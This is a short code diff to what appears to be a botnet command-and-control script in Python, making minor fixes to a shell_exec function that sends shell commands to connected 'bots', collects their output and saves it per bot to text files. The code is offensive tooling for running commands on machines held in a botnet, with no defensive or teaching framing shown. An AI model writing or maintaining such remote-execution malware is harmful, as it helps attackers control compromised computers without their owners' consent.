@@ -69,6 +69,7 @@ def make_output_file(name,data):
     file = open(name+'.txt','w')
     file.write(data)
     file.close()
+    print("[*] Output stored in %s"%(name+'.txt'))
     return
 
 def shell_exec(cmd):
@@ -79,8 +80,8 @@ def shell_exec(cmd):
         if(resp == "DONE"):
             shell_resp = botnet[bot].recv(1024).decode()
             print("[*] Shell execution successful on %s"%(bot))
-            make_output_file(bot,shell_resp)
-        if(resp == "FAILED"):
+            make_output_file(str(bot),str(shell_resp))
+        elif(resp == "FAILED"):
             print("[*] Shell execution failed on %s"%(bot))
 
 def exec_command(cmd):
